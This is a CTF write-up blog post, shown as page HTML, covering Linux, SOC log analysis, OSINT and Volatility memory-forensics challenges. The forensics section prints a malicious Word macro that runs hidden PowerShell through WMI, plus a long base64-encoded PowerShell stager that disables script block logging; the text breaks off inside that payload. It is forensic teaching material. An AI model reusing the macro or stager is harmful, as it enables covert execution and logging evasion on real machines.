@@ -1,0 +1,837 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><title>DFIR-FI » [0x6] Cyber Security Essentials CTF</title>
+<meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css><link rel=stylesheet href=/css/style.css></head><body><header><div class=menu><div class=hamburger id=hamburger>&#9776;</div><nav class=nav-links id=nav-links><a href=/ class=logo><img src=/images/logo.png alt=Logo></a><div class=separator></div><a href=/contribute/>Contribute</a>
+<a href=/blog/>Blog</a>
+<a href=/training/>Training</a>
+<a href=/community/>Community</a>
+<a href=/about/>About</a></nav><div class=rss-link><a href=/rss.xml><i class="fa fa-rss"></i></a></div></div></header><main class=flex-fill><div class=container><div class=row><div class=col-12><h1>[0x6] Cyber Security Essentials CTF</h1><h2 class=subtitle>Write-up</h2><div class=tags>Tags «
+<a href=/categories/tools class=tag>tools</a>
+<a href=/categories/training class=tag>training</a>
+»</div><div class=author-info><div class=author-photo><img src=https://example.org/images/whois.jpg alt="Juho Jauhiainen"></div><div class=author-details><p><strong><a href=/about/whois/>whois</a></strong></p><small class=text-muted><i class="fa-regular fa-calendar"></i> July 23, 2020 | </small><small class=text-muted><i class="fa-regular fa-clock"></i> 25 min read</small></div></div><div class=content><blockquote><p>Cyber Security Essentials is a course series I was organizing in <a href=https://helsec.fi>HelSec</a> with <a href=https://www.futurefemale.com>Future Female</a>. CSE had 6 lectures and the CTF was organized at the end of the course. The course was aimed for female who are interested working in technical side of the Cyber Security OR just started in the field. This CTF was made 99% by me alone and was purposed to be entry level. More information about the course series can be found from <a href=https://www.futurefemale.com/news/future-female-x-helsec-cyber-security-essentials/>here</a>.</p></blockquote><h2 id=results>Results</h2><p>The competition was hosted on CTFd at <a href=https://ctf.helsec.fi>ctf.helsec.fi</a> and here are the top competitors:
+<img src=/images/blog/cse_top10.png alt=Screenshot></p><p>Congratz all! ᕕ( ՞ ᗜ ՞ )ᕗ</p><hr><h2 id=challenges---q-general>Challenges -> Q: General</h2><h3 id=bash>Bash</h3><blockquote><p>Q: Recap of the Linux commands.
+Download the file and run it.
+P.S. You can cheat in this but I bet it&rsquo;s harder than doing it properly</p></blockquote><p>Purposed way:</p><pre tabindex=0><code>./bash
+HelSec x Future Female
+-----------------------
+exit = exit commandline
+start = start questions
+flag = print flag
+hi = say hi
+----------------------
+# flag
+Answer the questions correctly first...
+#
+#
+# start
+What command lets you run super user commands?
+Answer: sudo
+Which command changes password on Linux?
+Answer: passwd
+Which Linux text editor we used in the course?
+Answer: vim
+Which command can be used to calculate md5 hash of a file?
+Answer: md5sum
+What command will UPDATE installed packages (not just the repositories)?
+Answer: apt-get upgrade
+Get the flag with command flag
+# flag
+flag{LINUX_IZ_S0_EZ!!}
+# exit
+</code></pre><p>The mentioned unintended way would be reversing it. =)</p><p>However, the flag is: flag{LINUX_IZ_S0_EZ!!}</p><h3 id=numb3rs>numb3rs</h3><blockquote><p>Q: Hello, friend. You don&rsquo;t know me, but I know you. I want to play a game. There is only one combination of numbers that gives you the answer. Know what to do. You better hurry up. Make your choice.</p></blockquote><p>This is a challenge I made last year for <a href=https://disobey.fi>Disobey</a> and <a href=https://nixuchallenge.com>Nixu Challenge</a>. The idea is to make a script that solves the puzzle.</p><p><img src=/images/blog/play_games.png alt=Screenshot></p><p>Here&rsquo;s my quick and dirty version (note that there&rsquo;s lot easier ways to solve this than the code I wrote for this walk-through):</p><pre tabindex=0><code>!/usr/bin/env python3
+
+import socket
+import time
+import os
+import sys
+
+class color:
+    red = &#34;\x1b[31m&#34;
+    green = &#34;\x1b[32m&#34;
+    default = &#34;\x1b[39m&#34;
+
+def receive(s):
+    print(&#34;{}[Reveived data]{}\n\n&#34;.format(color.red, color.default))
+    data = b&#34;&#34;
+    while True:
+        # Receive data max 4096 bytes at a time
+        pack = s.recv(4096)
+        data += pack
+        # Break the loop if data is less than 1024 bytes in size
+        if len(pack) &lt; 1024:
+            break
+    # Print the output so we can more easily read how the we are doing
+    print(&#34;{}&#34;.format(data.decode(&#34;UTF-8&#34;)))
+    if &#34;flag&#34; in data.decode(&#34;UTF-8&#34;):
+        sys.exit(1)        
+    # Sleep while before returning
+    time.sleep(0.3)
+    return data.decode(&#34;UTF-8&#34;)
+
+def send_data(s, data):
+    print(&#34;{}[Sending data]{}\n{}&#34;.format(color.green,color.default,str(data)))
+    s.send(str.encode(data))
+    # Sleep while before returning
+    time.sleep(0.3)
+    return
+
+def get_correct(data):
+    correct = &#34;&#34;
+    for char in data.split():
+        if char.isdigit():
+            return char
+
+def main():
+    while True:
+        # Connect to server
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((&#34;64.225.65.251&#34;, 1337))
+        # Get the first response
+        response=receive(s)
+
+        # Get the second response if necessary (sometimes the server sends it in the first response)
+        if &#34;61v3 numb3r&#34; not in response:
+            response=receive(s)
+
+        # Check if our sq.txt file exists, the file is used to store and read results. If not, send &#39;1337&#39; as response otherwise loop the file
+        if os.path.exists(&#39;./sq.txt&#39;):
+            with open(&#34;sq.txt&#34;, &#34;r&#34;) as f:
+                for value in f:
+                    send_data(s, value.replace(&#34;\n&#34;,&#34;&#34;))
+                    response=receive(s)
+
+        # Send 1337 or any other randon number
+        send_data(s, &#34;1337&#34;)
+        # Get response and the correct number
+        response=receive(s)
+        # Close the connection
+        s.close()
+        correct_number=get_correct(response)
+
+        # Write the right number to our file
+        if os.path.exists(&#39;./sq.txt&#39;):
+            armode = &#39;a&#39;
+        else:
+            armode = &#39;w&#39;
+        f = open(&#34;./sq.txt&#34;, armode)
+        f.write(correct_number+&#34;\n&#34;)
+        f.close()
+
+if __name__ == &#34;__main__&#34;:
+    main()
+</code></pre><p>Running the code will print the flag after a while</p><pre tabindex=0><code>~$ python3 solve.py
+&lt;-- Lot of output redacted --&gt;
+flag{ApPRoVEd_leE7_HAxOr_8END1n9_7hE_71mE}
+</code></pre><p>The flag is: flag{ApPRoVEd_leE7_HAxOr_8END1n9_7hE_71mE}</p><hr><h2 id=challenges---q-security-operations>Challenges -> Q: Security Operations</h2><h3 id=soc-1>SOC #1</h3><blockquote><p>Q: What is the centralized log system called (abbreviation)?</p></blockquote><p><a href=https://en.wikipedia.org/wiki/Security_information_and_event_management>SIEM</a></p><h3 id=soc-2>SOC #2</h3><blockquote><p>Q: Which HTTP command lists all available methods (GET, POST etc.)?</p></blockquote><p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS>OPTIONS</a></p><h3 id=soc-3>SOC #3</h3><blockquote><p>Q: There&rsquo;s Linux/Tsunami DOS related traffic in the access.log. What is the corresponding IP address of potentially infected host?</p></blockquote><p>Google: &ldquo;Linux/Tsunami DOS&rdquo; and find out <a href=https://doc.emergingthreats.net/bin/view/Main/2022760>User-Agent x00_-gawa.sa.pilipinas.2015</a>.</p><pre tabindex=0><code>~$ grep &#34;x00_-gawa.sa.pilipinas.2015&#34; access.log
+138.121.183.58 - - [22/Sep/2015:13:23:27 +0000] &#34;GET /Ringing.at.your.dorbell! HTTP/1.0&#34; 404 459 &#34;http://google.com/search?q=2+guys+1+horse&#34; &#34;x00_-gawa.sa.pilipinas.2015&#34;
+37.17.130.36 - - [01/Oct/2015:01:26:48 +0000] &#34;GET /Ringing.at.your.dorbell! HTTP/1.0&#34; 404 459 &#34;http://google.com/search?q=2+guys+1+horse&#34; &#34;x00_-gawa.sa.pilipinas.2015&#34;
+37.17.130.36 - - [01/Oct/2015:01:26:48 +0000] &#34;GET / HTTP/1.0&#34; 200 329 &#34;-&#34; &#34;x00_-gawa.sa.pilipinas.2015&#34;
+37.17.130.36 - - [01/Oct/2015:01:26:49 +0000] &#34;GET / HTTP/1.0&#34; 200 329 &#34;-&#34; &#34;x00_-gawa.sa.pilipinas.2015&#34;
+37.17.130.36 - - [01/Oct/2015:01:26:50 +0000] &#34;GET / HTTP/1.0&#34; 200 329 &#34;-&#34; &#34;x00_-gawa.sa.pilipinas.2015&#34;
+</code></pre><p>The answer is 37.17.130.36 (see the HTTP response 200 vs 404).</p><h3 id=soc-4>SOC #4</h3><blockquote><p>Q: Which host has most entries in the access.log? Answer the IP address.</p></blockquote><pre tabindex=0><code>~$ awk &#39;{print $1}&#39; access.log|sort|uniq -c|sort -nr|head -n3
+     73 61.160.247.11
+     59 222.186.21.90
+     28 89.110.147.28
+</code></pre><p>Answer: 61.160.247.11</p><h3 id=soc5>SOC#5</h3><blockquote><p>Q: IP address 61.160.247.11 has the most entiries in the access.log. How many?</p></blockquote><pre tabindex=0><code>~$ grep &#34;61.160.247.11&#34; access.log|wc -l
+73
+</code></pre><hr><h2 id=challenges---q-osint>Challenges -> Q: OSINT</h2><h3 id=osint-1>OSINT #1</h3><blockquote><p>Q: Investigate <a href=mailto:foo.bar@ctf.helsec.fi>foo.bar@ctf.helsec.fi</a></p></blockquote><p>This challenge was supposed to be simple OSINT challenge but it turned out to be impossible&mldr; because either I screwed up or pastebin deleted the paste. I &ldquo;dumped&rdquo; password for the account <a href=mailto:foo.bar@ctf.helsec.fi>foo.bar@ctf.helsec.fi</a> and if I recall right, the paste was available the next day it was uploaded. For some reason it is not listed anymore.</p><h3 id=osint-2>OSINT #2</h3><blockquote><p>Q: Can you find anything special from foobar.helsec.fi ?</p></blockquote><p>DNS stuff:</p><pre tabindex=0><code>~$ host foobar.helsec.fi
+foobar.helsec.fi has address 127.0.0.1
+ ~$ host -t TXT foobar.helsec.fi
+foobar.helsec.fi descriptive text &#34;c29tZXRoaW5nc3BlY2lhbC5oZWxzZWMuZmkK&#34;
+ ~$ echo &#34;c29tZXRoaW5nc3BlY2lhbC5oZWxzZWMuZmkK&#34;|base64 -d
+somethingspecial.helsec.fi
+
+
+ ~$ host somethingspecial.helsec.fi
+somethingspecial.helsec.fi has address 127.0.0.1
+ ~$ host -t TXT somethingspecial.helsec.fi
+somethingspecial.helsec.fi descriptive text &#34;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&#34;
+ ~$ echo &#34;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&#34;|base64 -d
+synt{GURER_VF_NYJNLF_FBZRGUVAT_VA_QAF}
+~$ echo &#34;c3ludHtHVVJFUl9WRl9OWUpOTEZfRkJaUkdVVkFUX1ZBX1FBRn0K&#34;|base64 -d|rot13
+flag{THERE_IS_ALWAYS_SOMETHING_IN_DNS}
+</code></pre><h3 id=osint-3>OSINT #3</h3><blockquote><p>Q: Rodrigo Gonzales is slipping from OPSEC on their recent beer related social media post.</p></blockquote><p><a href=https://twitter.com/rodrigo_gonaz/status/1270298024774959104>https://twitter.com/rodrigo_gonaz/status/1270298024774959104</a></p><pre tabindex=0><code>~$ echo &#34;ZmxhZ3swUFMzQ30K&#34;|base64 -d
+flag{0PS3C}
+</code></pre><hr><h2 id=challenges---q-memory-forensics>Challenges -> Q: Memory forensics</h2><h3 id=volatility-profile>Volatility profile</h3><blockquote><p>Q: What is the correct Volatility profile of the image file?</p></blockquote><p>The profile can be determined using imageinfo and kdbgscan. The kdbgscan gives following result:</p><pre tabindex=0><code>**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_14393 (6.4.14393 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_14393
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_17763 (6.4.17763 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_17763
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_17134 (6.4.17134 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_17134
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_10586 (6.4.10586 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_10586
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_16299 (6.4.16299 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_16299
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win2016x64_14393 (6.4.14393 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win2016x64_14393
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+
+**************************************************
+Instantiating KDBG using: Unnamed AS Win10x64_15063 (6.4.15063 64bit)
+Offset (V)                    : 0xf8024dab65e0
+Offset (P)                    : 0x20b65e0
+KdCopyDataBlock (V)           : 0xf8024d9415a8
+Block encoded                 : Yes
+Wait never                    : 0x32e9704bc007722e
+Wait always                   : 0x3b916d853826c000
+KDBG owner tag check          : True
+Profile suggestion (KDBGHeader): Win10x64_15063
+Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+Service Pack (CmNtCSDVersion) : 0
+Build string (NtBuildLab)     : 17763.1.amd64fre.rs5_release.180
+PsActiveProcessHead           : 0xfffff8024dac65e0 (139 processes)
+PsLoadedModuleList            : 0xfffff8024dad26f0 (185 modules)
+KernelBase                    : 0xfffff8024d6b9000 (Matches MZ: True)
+Major (OptionalHeader)        : 10
+Minor (OptionalHeader)        : 0
+KPCR                          : 0xfffff8024c998000 (CPU 0)
+KPCR                          : 0xffff858058920000 (CPU 1)
+</code></pre><p>We can see the correct Windows build version from Version64 field:</p><pre tabindex=0><code>Version64                     : 0xf8024dab9f08 (Major: 15, Minor: 17763)
+</code></pre><p>This means the right profile is Win10x64_17763.</p><p>Hint: After the correct profile is determined, I suggest you to run following to save time:</p><pre tabindex=0><code>for plugin in pstree pslist psscan psxview dlllist getsids handles netscan filescan malfind svcscan cmdscan consoles; do vol.py -f finalboss.mem --profile=Win10x64_17763 $plugin |tee $plugin.txt; done
+</code></pre><p>This will run some basic plugins and write text files out of them for further analysis. There are some wrappers that do this more efficiently (f.e. multithreading & dump artifacts) but this is good start. =)</p><h3 id=image-time>Image time</h3><blockquote><p>Q: When was the image taken?</p></blockquote><p>The imageinfo plugin outputs following:</p><pre tabindex=0><code>Suggested Profile(s) : Win10x64_17134, Win10x64_14393, Win10x64_10586, Win10x64_16299, Win2016x64_14393, Win10x64_17763, Win10x64_15063 (Instantiated with Win10x64_15063)
+           AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
+           AS Layer2 : FileAddressSpace (/home/kali/cse/mem/finalboss.mem)
+            PAE type : No PAE
+                 DTB : 0x1ad002L
+                KDBG : 0xf8024dab65e0L
+Number of Processors : 2
+Image Type (Service Pack) : 0
+      KPCR for CPU 0 : 0xfffff8024c998000L
+      KPCR for CPU 1 : 0xffff858058920000L
+   KUSER_SHARED_DATA : 0xfffff78000000000L
+ Image date and time : 2020-02-12 21:04:47 UTC+0000
+Image local date and time : 2020-02-12 23:04:47 +0200
+</code></pre><p>The answer is 2020-02-12 21:04:47 UTC+0000.</p><h3 id=imaging>Imaging</h3><blockquote><p>Q: Which software was LIKELY used to take the image?</p></blockquote><p>Following program has been executed few seconds before the memory dump was taken:</p><pre tabindex=0><code>... 0xffff980f736ce500:FTK Imager.exe                5608   1488     22      0 2020-02-12 21:04:13 UTC+0000
+</code></pre><p>FTK Imager is also known tool for memory dumping.</p><h3 id=user-name>User name</h3><blockquote><p>Q: What is the name of the main user on the workstation?</p></blockquote><p>User accounts always start with SID S-1-5-21 so we can grep that string from getsids:</p><pre tabindex=0><code>~$ cat getsids.txt|grep &#34;S-1-5-21-&#34;|cut -d&#39;:&#39; -f2|sort|uniq -c|sort -nr|head -n100
+     49  S-1-5-21-2034586335-2782532192-897599191-513 (Domain Users)
+     49  S-1-5-21-2034586335-2782532192-897599191-1001 (Rodrigo Gonzales)
+</code></pre><p>The first one is group, the second one is user (RID >= 1000). The answer is Rodrigo Gonzales</p><h3 id=malicious-document>Malicious document</h3><blockquote><p>Q: What is the name of the suspicious macro document? Please include the file extension in the answer.</p></blockquote><p>Office tools are usually used to open macro documents, pslist shows Word has been executed:</p><pre tabindex=0><code>~$ grep -i word pslist.txt
+0xffff980f75c52080 WINWORD.EXE            2796   1488     18        0      1      1 2020-02-12 20:56:01 UTC+0000
+</code></pre><p>Let&rsquo;s check handles of the process if there&rsquo;s something suspicious:</p><pre tabindex=0><code>~$ grep 2796 handles.txt|grep -i doc
+0xffff980f7581bb40   2796              0xde4           0x12019f File             \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>The answer is pystyy_vetaeae-invitation.docm</p><h3 id=carrier>Carrier</h3><blockquote><p>Q: What is the process ID (PID) of the process, which started the malicious execution (e.q. opened the carrier file (the macro document))?</p></blockquote><p>This question is basically reversed version of the Malicious document question. Let&rsquo;s grep the name from handles and get the same output. =)</p><pre tabindex=0><code>~$ grep pystyy_vetaeae-invitation.docm handles.txt
+0xffff980f7581bb40   2796              0xde4           0x12019f File             \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>This can also be confirmed by checking cmdlines of every executed porcess:</p><pre tabindex=0><code>~$ grep pystyy_veta cmdline.txt -B1
+WINWORD.EXE pid:   2796
+Command line : &#34;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&#34; /n &#34;C:\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm&#34; /o &#34;&#34;
+</code></pre><p>The answer is 2796.</p><h3 id=carrier-time>Carrier time</h3><blockquote><p>Q: When the process with ID 2796 was started?</p></blockquote><p>Pslist has column for process start times:</p><pre tabindex=0><code>~$ grep 2796 pslist.txt
+0xffff980f75c52080 WINWORD.EXE            2796   1488     18        0      1      1 2020-02-12 20:56:01 UTC+0000
+</code></pre><p>The answer is 2020-02-12-20-56-01</p><h3 id=macros-macros-macros>Macros macros macros</h3><blockquote><p>Q: What is the process ID (PID) of the process, which WAS started by the macro document?</p></blockquote><p>This one is more tricky. The Word is not parent process of this process as the macros execute.</p><p>We can see PowerShell process executed by WMI. This kind of behaviour should be investigated more closely and could be the one! However, we can&rsquo;t verify it without investigating the macros:</p><pre tabindex=0><code>... 0xffff980f7292f240:WmiPrvSE.exe                  3416    840     10      0 2020-02-12 20:52:49 UTC+0000
+       audit: \Device\HarddiskVolume4\Windows\System32\wbem\WmiPrvSE.exe
+       cmd: C:\Windows\system32\wbem\wmiprvse.exe
+       path: C:\Windows\system32\wbem\wmiprvse.exe
+.... 0xffff980f7590d080:powershell.exe               3908   3416     14      0 2020-02-12 20:56:13 UTC+0000
+        audit: \Device\HarddiskVolume4\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        cmd:
+        path: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</code></pre><p>Let&rsquo;s dump the docm and see the macros:</p><pre tabindex=0><code>~$ vol.py -f finalboss.mem --profile=Win10x64_17763 dumpfiles -n -i -r \\.docm --dump-dir=files
+Volatility Foundation Volatility Framework 2.6.1
+DataSectionObject 0xffff980f7581bb40   2796   \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+SharedCacheMap 0xffff980f7581bb40   2796   \Device\HarddiskVolume4\Users\Rodrigo Gonzales\Desktop\pystyy_vetaeae-invitation\pystyy_vetaeae-invitation.docm
+</code></pre><p>The easiest way to investigate the macros is to install oletools:</p><pre tabindex=0><code>~$ pip install oletools
+</code></pre><p>Remember to add $HOME/.local/bin to path.</p><pre tabindex=0><code>~$ olevba file.2796.0xffff980f72daa9b0.pystyy_vetaeae-invitation.docm.dat
+Public Function xsEC() As Variant
+        strComputer = &#34;.&#34;
+        Set objWMIService = GetObject(&#34;winmgmts:\\&#34; &amp; strComputer &amp; &#34;\root\cimv2&#34;)
+        Dim yQf As String
+        yQf = &#34;powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVg&#34;
+
+        &lt;-- Lot of base64 encoded PowerShell redacted --&gt;
+
+        Const HIDDEN_WINDOW = 0
+        Set objStartup = objWMIService.Get(&#34;Win32_ProcessStartup&#34;)
+        Set objConfig = objStartup.SpawnInstance_
+        objConfig.ShowWindow = HIDDEN_WINDOW
+        Set objProcess = GetObject(&#34;winmgmts:\\&#34; &amp; strComputer &amp; &#34;\root\cimv2:Win32_Process&#34;)
+        objProcess.Create yQf, Null, objConfig, intProcessID
+End Function
+</code></pre><p>As we can see from the output, the macro starts WMI and executes the PowerShell paylaod there.</p><p>This means the suspicious WMI service is oujr answer as we suspected in the first place. The answer is 3416.</p><h3 id=powers-hell>Powers Hell</h3><blockquote><p>Q: Some suspicious powershell was executed. What was the executed command (starting with powershell -flag1 -flag2 etc&mldr;)</p></blockquote><p>We already extracted the PowerShell from the file with oletools. To convert it to form required by the question, we can just calculate it by pasting it to file and adding print(yQf) at the end and running it with python:</p><pre tabindex=0><code>~$ python3 powershell.txt
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBpAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJAAxADEAQgBEADgAPQBbAFIARQBGAF0ALgBBAHMAUwBlAE0AQgBsAFkALgBHAEUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBlAFQARgBpAEUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAMQAxAGIARAA4ACkAewAkAGEAMQA4AGUAMQA9ACQAMQAxAGIAZAA4AC4ARwBlAFQAVgBBAGwAVQBFACgAJABuAHUAbABMACkAOwBJAGYAKAAkAGEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AEUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABBADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJABWAGEAbAA9AFsAQwBPAEwATABlAEMAdABpAG8ATgBzAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAFQAaQBPAG4AQQByAFkAWwBzAHQAUgBpAG4AZwAsAFMAeQBzAHQARQBNAC4ATwBCAGoAZQBDAHQAXQBdADoAOgBuAEUAdwAoACkAOwAkAFYAQQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAYQBsAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAQQAxADgARQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAYQBMAH0ARQBMAHMARQB7AFsAUwBjAHIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcARQB0AEYASQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAE4AdQBMAGwALAAoAE4AZQB3AC0ATwBiAEoARQBDAFQAIABDAG8AbABsAGUAQwBUAGkATwBuAHMALgBHAEUAbgBFAHIASQBjAC4ASABhAHMA